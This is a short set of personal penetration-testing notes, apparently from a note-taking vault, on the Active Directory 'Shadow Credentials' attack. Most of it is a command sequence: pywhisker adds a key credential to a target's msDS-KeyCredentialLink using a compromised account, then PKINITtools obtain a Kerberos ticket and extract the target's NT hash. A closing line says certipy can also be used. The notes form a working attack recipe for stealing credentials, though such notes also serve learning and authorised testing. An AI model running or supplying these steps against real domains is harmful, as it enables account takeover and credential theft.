If you are able to write the msDS-KeyCredentialLink property of a user/computer, you can retrieve the NT hash for that object
  
Can do with with pywhisker and pkinit toolkit
  
adding shadow credentials for a user
- python3 [pywhisker.py](http://pywhisker.py/) --action add -d <DOMAIN> -u '<compromised_user>' -p '<pass>' --dc-ip <IP> -t '<target_user>'
    
    - this put a pfx file into the pywhisker folder, put that into the PKINITtools folder
    
    - it will also give you the password to the file in the pywhisker output
    
  
export the ccache created
- export KRB5CCNAME=man_svc.ccache
  
use the key from the output above
- python3 [gettgtpkinit.py](http://gettgtpkinit.py) <DOMAIN>/<target_user> -cert-pfx <file>.pfx -pfx-pass <pass>
    
    - this output will give you another key that you need to get the NT hash
    
  
get the NT hash
- python3 [getnthash.py](http://getnthash.py) <DOMAIN>/<target_user> -key <key>
  
  
  
  
can also user certipy apparently
![[../../assets/Shadow Credentials/image 410.png|image 410.png]]